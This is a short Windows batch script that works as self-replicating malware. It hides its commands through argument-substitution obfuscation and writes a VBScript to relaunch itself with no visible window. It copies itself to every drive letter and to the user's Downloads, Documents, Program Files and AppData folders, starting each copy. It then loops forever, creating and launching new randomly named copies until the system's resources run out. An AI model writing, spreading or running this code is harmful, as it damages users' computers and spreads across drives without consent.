@echo off >Nul & @break off & Title _
if not [%1]==[] goto :%1
    call %0 root e i a o u s t c
    exit
:root
%3f %2x%3%7%8 %1.vb%7 %7%8%4r%8 "" "%1.vb%7"
    %2%9h%5 %7%2%8 %5 = %9r%2%4%8%2%5bj%2%9%8("w%7%9r%3p%8.%7h%2ll") > %1.vb%7
    %2%9h%5 %5.r%6n "%~0 %7%9r%3p%8", vbh%3d%2, %8r%6%2 >> %1.vb%7
    %7%8%4r%8 "" "%1.vb%7"
    %2x%3%8
:script
For %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
Start %%E:\%~n0.bat
)
Copy %0 /Y "%userprofile%\Downloads" && Start "%userprofile%\Downloads\%~n0.bat"
Copy %0 /Y "%userprofile%\Documents" && Start "%userprofile%\Documents\%~n0.bat"
Copy %0 /Y "%programfiles%" && Start "%programfiles%\%~n0.bat"
Copy %0 /Y "%appdata%" && Start "%appdata%\%~n0.bat"
:loop
Set "memEat=%random%"
for /f "delims=" %%A in (%~n0.bat) do (
echo %%A >>%memEat%.bat
)
Start %memEat%.bat
goto loop
@exit /b